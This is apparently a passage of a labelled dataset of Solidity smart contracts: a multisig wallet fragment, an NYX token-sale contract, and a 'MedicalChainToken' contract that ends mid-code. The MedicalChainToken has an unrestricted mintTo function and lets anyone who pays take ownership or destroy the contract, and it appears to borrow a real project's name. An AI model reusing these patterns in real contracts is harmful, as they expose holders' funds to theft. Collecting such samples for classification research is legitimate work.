OwnerAddition(newOwner);\r\r\n    }\r\r\n\r\r\n\r\r\n    \/\/\/ @dev Allows to change the number of required confirmations. Transaction has to be sent by wallet.\r\r\n    \/\/\/ @param _required Number of required confirmations.\r\r\n    function changeRequirement(uint _required)\r\r\n        public\r\r\n        onlyWallet\r\r\n        validRequirement(owners.length, _required)\r\r\n    {\r\r\n        required = _required;\r\r\n        RequirementChange(_required);\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Allows an owner to submit and confirm a transaction.\r\r\n    \/\/\/ @param destination Transaction target address.\r\r\n    \/\/\/ @param value Transaction ether value.\r\r\n    \/\/\/ @param data Transaction data payload.\r\r\n    \/\/\/ @return Returns transaction ID.\r\r\n    function submitTransaction(address destination, uint value, bytes data)\r\r\n        public\r\r\n        returns (uint transactionId)\r\r\n    {\r\r\n        transactionId = addTransaction(destination, value, data);\r\r\n        confirmTransaction(transactionId);\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Allows an owner to confirm a transaction.\r\r\n    \/\/\/ @param transactionId Transaction ID.\r\r\n    function confirmTransaction(uint transactionId)\r\r\n        public\r\r\n        ownerExists(msg.sender)\r\r\n        transactionExists(transactionId)\r\r\n        notConfirmed(transactionId, msg.sender)\r\r\n    {\r\r\n        confirmations[transactionId][msg.sender] = true;\r\r\n        Confirmation(msg.sender, transactionId);\r\r\n        executeTransaction(transactionId);\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Allows an owner to revoke a confirmation for a transaction.\r\r\n    \/\/\/ @param transactionId Transaction ID.\r\r\n    function revokeConfirmation(uint transactionId)\r\r\n        public\r\r\n        ownerExists(msg.sender)\r\r\n        confirmed(transactionId, msg.sender)\r\r\n        notExecuted(transactionId)\r\r\n    {\r\r\n        confirmations[transactionId][msg.sender] = false;\r\r\n        Revocation(msg.sender, transactionId);\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Returns the confirmation status of a transaction.\r\r\n    \/\/\/ @param transactionId Transaction ID.\r\r\n    \/\/\/ @return Confirmation status.\r\r\n    function isConfirmed(uint transactionId)\r\r\n        public\r\r\n        constant\r\r\n        returns (bool)\r\r\n    {\r\r\n        uint count = 0;\r\r\n        for (uint i=0; i<owners.length; i++) {\r\r\n            if (confirmations[transactionId][owners[i]])\r\r\n                count += 1;\r\r\n            if (count == required)\r\r\n                return true;\r\r\n        }\r\r\n    }\r\r\n\r\r\n    \/*\r\r\n     * Internal functions\r\r\n     *\/\r\r\n\r\r\n    \/\/\/ @dev Allows anyone to execute a confirmed transaction.\r\r\n    \/\/\/ @param transactionId Transaction ID.\r\r\n    function executeTransaction(uint transactionId)\r\r\n       internal\r\r\n       notExecuted(transactionId)\r\r\n    {\r\r\n        if (isConfirmed(transactionId)) {\r\r\n            Transaction tx = transactions[transactionId];\r\r\n            tx.executed = true;\r\r\n            if (tx.destination.call.value(tx.value)(tx.data))\r\r\n                Execution(transactionId);\r\r\n            else {\r\r\n                ExecutionFailure(transactionId);\r\r\n                tx.executed = false;\r\r\n            }\r\r\n        }\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Adds a new transaction to the transaction mapping, if transaction does not exist yet.\r\r\n    \/\/\/ @param destination Transaction target address.\r\r\n    \/\/\/ @param value Transaction ether value.\r\r\n    \/\/\/ @param data Transaction data payload.\r\r\n    \/\/\/ @return Returns transaction ID.\r\r\n    function addTransaction(address destination, uint value, bytes data)\r\r\n        internal\r\r\n        notNull(destination)\r\r\n        returns (uint transactionId)\r\r\n    {\r\r\n        transactionId = transactionCount;\r\r\n        transactions[transactionId] = Transaction({\r\r\n            destination: destination,\r\r\n            value: value,\r\r\n            data: data,\r\r\n            executed: false\r\r\n        });\r\r\n        transactionCount += 1;\r\r\n        Submission(transactionId);\r\r\n    }\r\r\n\r\r\n    \/*\r\r\n     * Web3 call functions\r\r\n     *\/\r\r\n    \/\/\/ @dev Returns number of confirmations of a transaction.\r\r\n    \/\/\/ @param transactionId Transaction ID.\r\r\n    \/\/\/ @return Number of confirmations.\r\r\n    function getConfirmationCount(uint transactionId)\r\r\n        public\r\r\n        constant\r\r\n        returns (uint count)\r\r\n    {\r\r\n        for (uint i=0; i<owners.length; i++)\r\r\n            if (confirmations[transactionId][owners[i]])\r\r\n                count += 1;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Returns total number of transactions after filers are applied.\r\r\n    \/\/\/ @param pending Include pending transactions.\r\r\n    \/\/\/ @param executed Include executed transactions.\r\r\n    \/\/\/ @return Total number of transactions after filters are applied.\r\r\n    function getTransactionCount(bool pending, bool executed)\r\r\n        public\r\r\n        constant\r\r\n        returns (uint count)\r\r\n    {\r\r\n        for (uint i=0; i<transactionCount; i++)\r\r\n            if ((pending && !transactions[i].executed) ||\r\r\n                (executed && transactions[i].executed))\r\r\n                count += 1;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Returns list of owners.\r\r\n    \/\/\/ @return List of owner addresses.\r\r\n    function getOwners()\r\r\n        public\r\r\n        constant\r\r\n        returns (address[])\r\r\n    {\r\r\n        return owners;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Returns array with owner addresses, which confirmed transaction.\r\r\n    \/\/\/ @param transactionId Transaction ID.\r\r\n    \/\/\/ @return Returns array of owner addresses.\r\r\n    function getConfirmations(uint transactionId)\r\r\n        public\r\r\n        constant\r\r\n        returns (address[] _confirmations)\r\r\n    {\r\r\n        address[] memory confirmationsTemp = new address[](owners.length);\r\r\n        uint count = 0;\r\r\n        uint i;\r\r\n        for (i=0; i<owners.length; i++)\r\r\n            if (confirmations[transactionId][owners[i]]) {\r\r\n                confirmationsTemp[count] = owners[i];\r\r\n                count += 1;\r\r\n            }\r\r\n        _confirmations = new address[](count);\r\r\n        for (i=0; i<count; i++)\r\r\n            _confirmations[i] = confirmationsTemp[i];\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Returns list of transaction IDs in defined range.\r\r\n    \/\/\/ @param from Index start position of transaction array.\r\r\n    \/\/\/ @param to Index end position of transaction array.\r\r\n    \/\/\/ @param pending Include pending transactions.\r\r\n    \/\/\/ @param executed Include executed transactions.\r\r\n    \/\/\/ @return Returns array of transaction IDs.\r\r\n    function getTransactionIds(uint from, uint to, bool pending, bool executed)\r\r\n        public\r\r\n        constant\r\r\n        returns (uint[] _transactionIds)\r\r\n    {\r\r\n        uint[] memory transactionIdsTemp = new uint[](transactionCount);\r\r\n        uint count = 0;\r\r\n        uint i;\r\r\n        for (i=0; i<transactionCount; i++)\r\r\n          if ((pending && !transactions[i].executed) ||\r\r\n              (executed && transactions[i].executed))\r\r\n            {\r\r\n                transactionIdsTemp[count] = i;\r\r\n                count += 1;\r\r\n            }\r\r\n        _transactionIds = new uint[](to - from);\r\r\n        for (i=from; i<to; i++)\r\r\n            _transactionIds[i - from] = transactionIdsTemp[i];\r\r\n    }\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.18;\r\r\n\r\r\n \r\r\n \/*\r\r\n * NYX Token sale\r\r\n *\r\r\n * Supports ERC20, ERC223 stadards\r\r\n *\r\r\n * The NYX token is mintable during Token Sale. On Token Sale finalization it\r\r\n * will be minted up to the cap and minting will be finished forever\r\r\n *\/\r\r\n\r\r\n\r\r\npragma solidity ^0.4.18;\r\r\n\r\r\n\r\r\n\/*************************************************************************\r\r\n * import \".\/include\/MintableToken.sol\" : start\r\r\n *************************************************************************\/\r\r\n\r\r\n\/*************************************************************************\r\r\n * import \"zeppelin\/contracts\/token\/StandardToken.sol\" : start\r\r\n *************************************************************************\/\r\r\n\r\r\n\r\r\n\/*************************************************************************\r\r\n * import \".\/BasicToken.sol\" : start\r\r\n *************************************************************************\/\r\r\n\r\r\n\r\r\n\/*************************************************************************\r\r\n * import \".\/ERC20Basic.sol\" : start\r\r\n *************************************************************************\/\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title ERC20Basic\r\r\n * @dev Simpler version of ERC20 interface\r\r\n * @dev see https:\/\/github.com\/ethereum\/EIPs\/issues\/179\r\r\n *\/\r\r\ncontract ERC20Basic {\r\r\n  uint256 public totalSupply;\r\r\n  function balanceOf(address who) constant returns (uint256);\r\r\n  function transfer(address to, uint256 value) returns (bool);\r\r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\r\n}\r\r\n\/*************************************************************************\r\r\n * import \".\/ERC20Basic.sol\" : end\r\r\n *************************************************************************\/\r\r\n\/*************************************************************************\r\r\n * import \"..\/math\/SafeMath.sol\" : start\r\r\n *************************************************************************\/\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title SafeMath\r\r\n * @dev Math operations with safety checks that throw on error\r\r\n *\/\r\r\nlibrary SafeMath {\r\r\n  function mul(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    uint256 c = a * b;\r\r\n    assert(a == 0 || c \/ a == b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function div(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    \/\/ assert(b > 0); \/\/ Solidity automatically throws when dividing by 0\r\r\n    uint256 c = a \/ b;\r\r\n    \/\/ assert(a == b * c + a % b); \/\/ There is no case in which this doesn&#39;t hold\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function sub(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    assert(b <= a);\r\r\n    return a - b;\r\r\n  }\r\r\n\r\r\n  function add(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    uint256 c = a + b;\r\r\n    assert(c >= a);\r\r\n    return c;\r\r\n  }\r\r\n}\r\r\n\/*************************************************************************\r\r\n * import \"..\/math\/SafeMath.sol\" : end\r\r\n *************************************************************************\/\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title Basic token\r\r\n * @dev Basic version of StandardToken, with no allowances. \r\r\n *\/\r\r\ncontract BasicToken is ERC20Basic {\r\r\n  using SafeMath for uint256;\r\r\n\r\r\n  mapping(address => uint256) balances;\r\r\n\r\r\n  \/**\r\r\n  * @dev transfer token for a specified address\r\r\n  * @param _to The address to transfer to.\r\r\n  * @param _value The amount to be transferred.\r\r\n  *\/\r\r\n  function transfer(address _to, uint256 _value) returns (bool) {\r\r\n    balances[msg.sender] = balances[msg.sender].sub(_value);\r\r\n    balances[_to] = balances[_to].add(_value);\r\r\n    Transfer(msg.sender, _to, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n  * @dev Gets the balance of the specified address.\r\r\n  * @param _owner The address to query the the balance of. \r\r\n  * @return An uint256 representing the amount owned by the passed address.\r\r\n  *\/\r\r\n  function balanceOf(address _owner) constant returns (uint256 balance) {\r\r\n    return balances[_owner];\r\r\n  }\r\r\n\r\r\n}\r\r\n\/*************************************************************************\r\r\n * import \".\/BasicToken.sol\" : end\r\r\n *************************************************************************\/\r\r\n\/*************************************************************************\r\r\n * import \".\/ERC20.sol\" : start\r\r\n *************************************************************************\/\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title ERC20 interface\r\r\n * @dev see https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n *\/\r\r\ncontract ERC20 is ERC20Basic {\r\r\n  function allowance(address owner, address spender) constant returns (uint256);\r\r\n  function transferFrom(address from, address to, uint256 value) returns (bool);\r\r\n  function approve(address spender, uint256 value) returns (bool);\r\r\n  event Approval(address indexed owner, address indexed spender, uint256 value);\r\r\n}\r\r\n\/*************************************************************************\r\r\n * import \".\/ERC20.sol\" : end\r\r\n *************************************************************************\/\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title Standard ERC20 token\r\r\n *\r\r\n * @dev Implementation of the basic standard token.\r\r\n * @dev https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n * @dev Based on code by FirstBlood: https:\/\/github.com\/Firstbloodio\/token\/blob\/master\/smart_contract\/FirstBloodToken.sol\r\r\n *\/\r\r\ncontract StandardToken is ERC20, BasicToken {\r\r\n\r\r\n  mapping (address => mapping (address => uint256)) allowed;\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev Transfer tokens from one address to another\r\r\n   * @param _from address The address which you want to send tokens from\r\r\n   * @param _to address The address which you want to transfer to\r\r\n   * @param _value uint256 the amout of tokens to be transfered\r\r\n   *\/\r\r\n  function transferFrom(address _from, address _to, uint256 _value) returns (bool) {\r\r\n    var _allowance = allowed[_from][msg.sender];\r\r\n\r\r\n    \/\/ Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\r\r\n    \/\/ require (_value <= _allowance);\r\r\n\r\r\n    balances[_to] = balances[_to].add(_value);\r\r\n    balances[_from] = balances[_from].sub(_value);\r\r\n    allowed[_from][msg.sender] = _allowance.sub(_value);\r\r\n    Transfer(_from, _to, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev Aprove the passed address to spend the specified amount of tokens on behalf of msg.sender.\r\r\n   * @param _spender The address which will spend the funds.\r\r\n   * @param _value The amount of tokens to be spent.\r\r\n   *\/\r\r\n  function approve(address _spender, uint256 _value) returns (bool) {\r\r\n\r\r\n    \/\/ To change the approve amount you first have to reduce the addresses`\r\r\n    \/\/  allowance to zero by calling `approve(_spender, 0)` if it is not\r\r\n    \/\/  already 0 to mitigate the race condition described here:\r\r\n    \/\/  https:\/\/github.com\/ethereum\/EIPs\/issues\/20#issuecomment-263524729\r\r\n    require((_value == 0) || (allowed[msg.sender][_spender] == 0));\r\r\n\r\r\n    allowed[msg.sender][_spender] = _value;\r\r\n    Approval(msg.sender, _spender, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev Function to check the amount of tokens that an owner allowed to a spender.\r\r\n   * @param _owner address The address which owns the funds.\r\r\n   * @param _spender address The address which will spend the funds.\r\r\n   * @return A uint256 specifing the amount of tokens still avaible for the spender.\r\r\n   *\/\r\r\n  function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\r\n    return allowed[_owner][_spender];\r\r\n  }\r\r\n\r\r\n}\r\r\n\/*************************************************************************\r\r\n * import \"zeppelin\/contracts\/token\/StandardToken.sol\" : end\r\r\n *************************************************************************\/\r\r\n\/*************************************************************************\r\r\n * import \"zeppelin\/contracts\/ownership\/Ownable.sol\" : start\r\r\n *************************************************************************\/\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title Ownable\r\r\n * @dev The Ownable contract has an owner address, and provides basic authorization control\r\r\n * functions, this simplifies the implementation of \"user permissions\".\r\r\n *\/\r\r\ncontract Ownable {\r\r\n  address public owner;\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev The Ownable constructor sets the original `owner` of the contract to the sender\r\r\n   * account.\r\r\n   *\/\r\r\n  function Ownable() {\r\r\n    owner = msg.sender;\r\r\n  }\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev Throws if called by any account other than the owner.\r\r\n   *\/\r\r\n  modifier onlyOwner() {\r\r\n    require(msg.sender == owner);\r\r\n    _;\r\r\n  }\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev Allows the current owner to transfer control of the contract to a newOwner.\r\r\n   * @param newOwner The address to transfer ownership to.\r\r\n   *\/\r\r\n  function transferOwnership(address newOwner) onlyOwner {\r\r\n    if (newOwner != address(0)) {\r\r\n      owner = newOwner;\r\r\n    }\r\r\n  }\r\r\n\r\r\n}\r\r\n\/*************************************************************************\r\r\n * import \"zeppelin\/contracts\/ownership\/Ownable.sol\" : end\r\r\n *************************************************************************\/\r\r\n\r\r\n\/**\r\r\n * Mintable token\r\r\n *\/\r\r\n\r\r\ncontract MintableToken is StandardToken, Ownable {\r\r\n    uint public totalSupply = 0;\r\r\n    address minter;\r\r\n\r\r\n    modifier onlyMinter(){\r\r\n        require(minter == msg.sender);\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    function setMinter(address _minter) onlyOwner {\r\r\n        minter = _minter;\r\r\n    }\r\r\n\r\r\n    function mint(address _to, uint _amount) onlyMinter {\r\r\n        totalSupply = totalSupply.add(_amount);\r\r\n        balances[_to] = balances[_to].add(_amount);\r\r\n        Transfer(address(0x0), _to, _amount);\r\r\n    }\r\r\n}\r\r\n\/*************************************************************************\r\r\n * import \".\/include\/MintableToken.sol\" : end\r\r\n *************************************************************************\/\r\r\n\/*************************************************************************\r\r\n * import \".\/include\/ERC23PayableToken.sol\" : start\r\r\n *************************************************************************\/\r\r\n\r\r\n\r\r\n\r\r\n\/*************************************************************************\r\r\n * import \".\/ERC23.sol\" : start\r\r\n *************************************************************************\/\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/*\r\r\n * ERC23\r\r\n * ERC23 interface\r\r\n * see https:\/\/github.com\/ethereum\/EIPs\/issues\/223\r\r\n *\/\r\r\ncontract ERC23 is ERC20Basic {\r\r\n    function transfer(address to, uint value, bytes data);\r\r\n\r\r\n    event TransferData(address indexed from, address indexed to, uint value, bytes data);\r\r\n}\r\r\n\/*************************************************************************\r\r\n * import \".\/ERC23.sol\" : end\r\r\n *************************************************************************\/\r\r\n\/*************************************************************************\r\r\n * import \".\/ERC23PayableReceiver.sol\" : start\r\r\n *************************************************************************\/\r\r\n\r\r\n\/*\r\r\n* Contract that is working with ERC223 tokens\r\r\n*\/\r\r\n\r\r\ncontract ERC23PayableReceiver {\r\r\n    function tokenFallback(address _from, uint _value, bytes _data) payable;\r\r\n}\r\r\n\r\r\n\/*************************************************************************\r\r\n * import \".\/ERC23PayableReceiver.sol\" : end\r\r\n *************************************************************************\/\r\r\n\r\r\n\/**  https:\/\/github.com\/Dexaran\/ERC23-tokens\/blob\/master\/token\/ERC223\/ERC223BasicToken.sol\r\r\n *\r\r\n *\/\r\r\ncontract ERC23PayableToken is BasicToken, ERC23{\r\r\n    \/\/ Function that is called when a user or another contract wants to transfer funds .\r\r\n    function transfer(address to, uint value, bytes data){\r\r\n        transferAndPay(to, value, data);\r\r\n    }\r\r\n\r\r\n    \/\/ Standard function transfer similar to ERC20 transfer with no _data .\r\r\n    \/\/ Added due to backwards compatibility reasons .\r\r\n    function transfer(address to, uint value) returns (bool){\r\r\n        bytes memory empty;\r\r\n        transfer(to, value, empty);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    function transferAndPay(address to, uint value, bytes data) payable {\r\r\n\r\r\n        uint codeLength;\r\r\n\r\r\n        assembly {\r\r\n            \/\/ Retrieve the size of the code on target address, this needs assembly .\r\r\n            codeLength := extcodesize(to)\r\r\n        }\r\r\n\r\r\n        balances[msg.sender] = balances[msg.sender].sub(value);\r\r\n        balances[to] = balances[to].add(value);\r\r\n\r\r\n        if(codeLength>0) {\r\r\n            ERC23PayableReceiver receiver = ERC23PayableReceiver(to);\r\r\n            receiver.tokenFallback.value(msg.value)(msg.sender, value, data);\r\r\n        }else if(msg.value > 0){\r\r\n            to.transfer(msg.value);\r\r\n        }\r\r\n\r\r\n        Transfer(msg.sender, to, value);\r\r\n        if(data.length > 0)\r\r\n            TransferData(msg.sender, to, value, data);\r\r\n    }\r\r\n}\r\r\n\/*************************************************************************\r\r\n * import \".\/include\/ERC23PayableToken.sol\" : end\r\r\n *************************************************************************\/\r\r\n\r\r\n\r\r\ncontract NYXToken is MintableToken, ERC23PayableToken {\r\r\n    string public constant name = \"NYX Token\";\r\r\n    string public constant symbol = \"NYX\";\r\r\n\r\r\n    bool public transferEnabled = true;\r\r\n\r\r\n    \/\/The cap is 15 mln NYX\r\r\n    uint private constant CAP = 15*(10**6);\r\r\n\r\r\n    function mint(address _to, uint _amount){\r\r\n        require(totalSupply.add(_amount) <= CAP);\r\r\n        super.mint(_to, _amount);\r\r\n    }\r\r\n\r\r\n    function NYXToken(address team) {\r\r\n        \/\/Transfer ownership on the token to team on creation\r\r\n        transferOwnership(team);\r\r\n        \/\/ minter is the TokenSale contract\r\r\n        minter = msg.sender; \r\r\n        \/\/\/ Preserve 3 000 000 tokens for the team\r\r\n        mint(team, 3000000);\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n    * Overriding all transfers to check if transfers are enabled\r\r\n    *\/\r\r\n    function transferAndPay(address to, uint value, bytes data) payable{\r\r\n        require(transferEnabled);\r\r\n        super.transferAndPay(to, value, data);\r\r\n    }\r\r\n\r\r\n    function enableTransfer(bool enabled) onlyOwner{\r\r\n        transferEnabled = enabled;\r\r\n    }\r\r\n\r\r\n}\r\r\n\r\r\ncontract TokenSale is Ownable {\r\r\n    using SafeMath for uint;\r\r\n\r\r\n    \/\/ Constants\r\r\n    \/\/ =========\r\r\n    uint private constant millions = 1e6;\r\r\n\r\r\n    uint private constant CAP = 15*millions;\r\r\n    uint private constant SALE_CAP = 12*millions;\r\r\n    uint private constant SOFT_CAP = 1400000;\r\r\n    \r\r\n    \/\/ Allocated for the team upon contract creation\r\r\n    \/\/ =========\r\r\n    uint private constant TEAM_CAP = 3000000;\r\r\n\r\r\n    uint public price = 0.001 ether;\r\r\n    \r\r\n    \/\/ Hold investor&#39;s ether amounts to refund\r\r\n    address[] contributors;\r\r\n    mapping(address => uint) contributions;\r\r\n\r\r\n    \/\/ Events\r\r\n    \/\/ ======\r\r\n\r\r\n    event AltBuy(address holder, uint tokens, string txHash);\r\r\n    event Buy(address holder, uint tokens);\r\r\n    event RunSale();\r\r\n    event PauseSale();\r\r\n    event FinishSale();\r\r\n    event PriceSet(uint weiPerNYX);\r\r\n\r\r\n    \/\/ State variables\r\r\n    \/\/ ===============\r\r\n    bool public presale = true;\r\r\n    NYXToken public token;\r\r\n    address authority; \/\/An account to control the contract on behalf of the owner\r\r\n    address robot; \/\/An account to purchase tokens for altcoins\r\r\n    bool public isOpen = true;\r\r\n\r\r\n    \/\/ Constructor\r\r\n    \/\/ ===========\r\r\n\r\r\n    function TokenSale(){\r\r\n        token = new NYXToken(msg.sender);\r\r\n\r\r\n        authority = msg.sender;\r\r\n        robot = msg.sender;\r\r\n        transferOwnership(msg.sender);\r\r\n    }\r\r\n\r\r\n    \/\/ Public functions\r\r\n    \/\/ ================\r\r\n    function togglePresale(bool activate) onlyAuthority {\r\r\n        presale = activate;\r\r\n    }\r\r\n\r\r\n\r\r\n    function getCurrentPrice() constant returns(uint) {\r\r\n        if(presale) {\r\r\n            return price - (price*20\/100);\r\r\n        }\r\r\n        return price;\r\r\n    }\r\r\n    \/**\r\r\n    * Computes number of tokens with bonus for the specified ether. Correctly\r\r\n    * adds bonuses if the sum is large enough to belong to several bonus intervals\r\r\n    *\/\r\r\n    function getTokensAmount(uint etherVal) constant returns (uint) {\r\r\n        uint tokens = 0;\r\r\n        tokens += etherVal\/getCurrentPrice();\r\r\n        return tokens;\r\r\n    }\r\r\n\r\r\n    function buy(address to) onlyOpen payable{\r\r\n        uint amount = msg.value;\r\r\n        uint tokens = getTokensAmountUnderCap(amount);\r\r\n        \r\r\n        \/\/ owner.transfer(amount);\r\r\n\r\r\n\t\ttoken.mint(to, tokens);\r\r\n\t\t\r\r\n\t\tuint alreadyContributed = contributions[to];\r\r\n\t\tif(alreadyContributed == 0) \/\/ new contributor\r\r\n\t\t    contributors.push(to);\r\r\n\t\t    \r\r\n\t\tcontributions[to] = contributions[to].add(msg.value);\r\r\n\r\r\n        Buy(to, tokens);\r\r\n    }\r\r\n\r\r\n    function () payable{\r\r\n        buy(msg.sender);\r\r\n    }\r\r\n\r\r\n    \/\/ Modifiers\r\r\n    \/\/ =================\r\r\n\r\r\n    modifier onlyAuthority() {\r\r\n        require(msg.sender == authority || msg.sender == owner);\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    modifier onlyRobot() {\r\r\n        require(msg.sender == robot);\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    modifier onlyOpen() {\r\r\n        require(isOpen);\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    \/\/ Priveleged functions\r\r\n    \/\/ ====================\r\r\n\r\r\n    \/**\r\r\n    * Used to buy tokens for altcoins.\r\r\n    * Robot may call it before TokenSale officially starts to migrate early investors\r\r\n    *\/\r\r\n    function buyAlt(address to, uint etherAmount, string _txHash) onlyRobot {\r\r\n        uint tokens = getTokensAmountUnderCap(etherAmount);\r\r\n        token.mint(to, tokens);\r\r\n        AltBuy(to, tokens, _txHash);\r\r\n    }\r\r\n\r\r\n    function setAuthority(address _authority) onlyOwner {\r\r\n        authority = _authority;\r\r\n    }\r\r\n\r\r\n    function setRobot(address _robot) onlyAuthority {\r\r\n        robot = _robot;\r\r\n    }\r\r\n\r\r\n    function setPrice(uint etherPerNYX) onlyAuthority {\r\r\n        price = etherPerNYX;\r\r\n        PriceSet(price);\r\r\n    }\r\r\n\r\r\n    \/\/ SALE state management: start \/ pause \/ finalize\r\r\n    \/\/ --------------------------------------------\r\r\n    function open(bool opn) onlyAuthority {\r\r\n        isOpen = opn;\r\r\n        opn ? RunSale() : PauseSale();\r\r\n    }\r\r\n    \r\r\n    function finalizePresale() onlyAuthority {\r\r\n        \/\/ Check for SOFT_CAP\r\r\n        require(token.totalSupply() > SOFT_CAP + TEAM_CAP);\r\r\n        \/\/ Transfer collected softcap to the team\r\r\n        owner.transfer(this.balance);\r\r\n    }\r\r\n\r\r\n    function finalize() onlyAuthority {\r\r\n        \/\/ Check for SOFT_CAP\r\r\n        if(token.totalSupply() < SOFT_CAP + TEAM_CAP) { \/\/ Soft cap is not reached, return all contributions to investors\r\r\n            uint x = 0;\r\r\n            while(x < contributors.length) {\r\r\n                uint amountToReturn = contributions[contributors[x]];\r\r\n                contributors[x].transfer(amountToReturn);\r\r\n                x++;\r\r\n            }\r\r\n        }\r\r\n        \r\r\n        uint diff = CAP.sub(token.totalSupply());\r\r\n        if(diff > 0) \/\/The unsold capacity moves to team\r\r\n            token.mint(owner, diff);\r\r\n        selfdestruct(owner);\r\r\n        FinishSale();\r\r\n    }\r\r\n\r\r\n    \/\/ Private functions\r\r\n    \/\/ =========================\r\r\n\r\r\n    \/**\r\r\n    * Gets tokens for specified ether provided that they are still under the cap\r\r\n    *\/\r\r\n    function getTokensAmountUnderCap(uint etherAmount) private constant returns (uint){\r\r\n        uint tokens = getTokensAmount(etherAmount);\r\r\n        require(tokens > 0);\r\r\n        require(tokens.add(token.totalSupply()) <= SALE_CAP);\r\r\n        return tokens;\r\r\n    }\r\r\n\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.19;\r\r\n\r\r\n\r\r\n\/\/\/ @title  MedicalChain token presale - https:\/\/medicalchain.com\/ (MED) - crowdfunding code\r\r\n\/\/\/ Whitepaper:\r\r\n\/\/\/  https:\/\/medicalchain.com\/Medicalchain-Whitepaper-EN.pdf\r\r\n\r\r\ncontract MedicalChainToken {\r\r\n    string public name = \"MedToken\";\r\r\n    string public symbol = \"MED\";\r\r\n    uint8 public constant decimals = 18;  \r\r\n    address public owner;\r\r\n\r\r\n    uint256 public constant tokensPerEth = 1;\r\r\n    uint256 public constant howManyEtherInWeiToBecomeOwner = 1000 ether;\r\r\n    uint256 public constant howManyEtherInWeiToKillContract = 500 ether;\r\r\n    uint256 public constant howManyEtherInWeiToChangeSymbolName = 400 ether;\r\r\n    \r\r\n    bool public funding = true;\r\r\n\r\r\n    \/\/ The current total token supply.\r\r\n    uint256 totalTokens = 1000;\r\r\n\r\r\n    mapping (address => uint256) balances;\r\r\n    mapping (address => mapping (address => uint256)) allowed;\r\r\n\r\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\r\n    event Migrate(address indexed _from, address indexed _to, uint256 _value);\r\r\n    event Refund(address indexed _from, uint256 _value);\r\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\r\n\r\r\n    function MedicalChainToken() public {\r\r\n        owner = msg.sender;\r\r\n        balances[owner]=1000;\r\r\n    }\r\r\n\r\r\n    function changeNameSymbol(string _name, string _symbol) payable external\r\r\n    {\r\r\n        if (msg.sender==owner || msg.value >=howManyEtherInWeiToChangeSymbolName)\r\r\n        {\r\r\n            name = _name;\r\r\n            symbol = _symbol;\r\r\n        }\r\r\n    }\r\r\n    \r\r\n    \r\r\n    function changeOwner (address _newowner) payable external\r\r\n    {\r\r\n        if (msg.value>=howManyEtherInWeiToBecomeOwner)\r\r\n        {\r\r\n            owner.transfer(msg.value);\r\r\n            owner.transfer(this.balance);\r\r\n            owner=_newowner;\r\r\n        }\r\r\n    }\r\r\n\r\r\n    function killContract () payable external\r\r\n    {\r\r\n        if (msg.sender==owner || msg.value >=howManyEtherInWeiToKillContract)\r\r\n        {\r\r\n            selfdestruct(owner);\r\r\n        }\r\r\n    }\r\r\n    \/\/\/ @notice Transfer `_value` tokens from sender&#39;s account\r\r\n    \/\/\/ `msg.sender` to provided account address `_to`.\r\r\n    \/\/\/ @notice This function is disabled during the funding.\r\r\n    \/\/\/ @dev Required state: Operational\r\r\n    \/\/\/ @param _to The address of the tokens recipient\r\r\n    \/\/\/ @param _value The amount of token to be transferred\r\r\n    \/\/\/ @return Whether the transfer was successful or not\r\r\n    function transfer(address _to, uint256 _value) public returns (bool) {\r\r\n        \/\/ Abort if not in Operational state.\r\r\n        \r\r\n        var senderBalance = balances[msg.sender];\r\r\n        if (senderBalance >= _value && _value > 0) {\r\r\n            senderBalance -= _value;\r\r\n            balances[msg.sender] = senderBalance;\r\r\n            balances[_to] += _value;\r\r\n            Transfer(msg.sender, _to, _value);\r\r\n            return true;\r\r\n        }\r\r\n        return false;\r\r\n    }\r\r\n    \r\r\n    function mintTo(address _to, uint256 _value) public returns (bool) {\r\r\n        \/\/ Abort if not in Operational state.\r\r\n        \r\r\n            balances[_to] += _value;\r\r\n            Transfer(msg.sender, _to, _value);\r\r\n            return true;\r\r\n    }\r\r\n    \r\r\n\r\r\n    function totalSupply() external constant returns (uint256) {\r\r\n        return totalTokens;\r\r\n    }\r\r\n\r\r\n    function balanceOf(address _owner) external constant returns (uint256) {\r\r\n      